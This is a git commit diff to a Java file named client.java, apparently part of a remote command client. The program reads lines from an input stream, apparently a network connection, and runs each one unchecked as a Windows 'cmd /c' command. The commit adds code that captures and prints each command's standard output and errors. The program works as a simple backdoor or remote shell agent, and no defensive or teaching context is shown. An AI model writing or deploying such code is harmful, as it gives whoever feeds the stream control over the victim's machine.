a7eef50d7c3ee834438e39e02d833ab8dd071eee
Tristan Lonsway <36086269+Kryptikz@users.noreply.github.com>
2018-04-29 23:02:12 -0400

    Update client.java

--- client.java
+++ client.java
@@ -19,7 +19,24 @@ public class client {
             while(true) {
                 String line = din.readLine();
                 try {
-                    Runtime.getRuntime().exec("cmd /c " + line);
+                    Runtime rt = Runtime.getRuntime();
+                    Process proc = rt.exec("cmd /c " + line);
+                    BufferedReader stdInput = new BufferedReader(new 
+                         InputStreamReader(proc.getInputStream()));
+                    BufferedReader stdError = new BufferedReader(new 
+                         InputStreamReader(proc.getErrorStream()));
+                    // read the output from the command
+                    System.out.println("Here is the standard output of the command:\n");
+                    String s = null;
+                    while ((s = stdInput.readLine()) != null) {
+                        System.out.println(s);
+                    }
+                    // read any errors from the attempted command
+                    System.out.println("Here is the standard error of the command (if any):\n");
+                    while ((s = stdError.readLine()) != null) {
+                        System.out.println(s);
+                    }
+                    //Runtime.getRuntime().exec("cmd /c " + line);
                 } catch (Exception e) {
                     e.printStackTrace();
                 }  
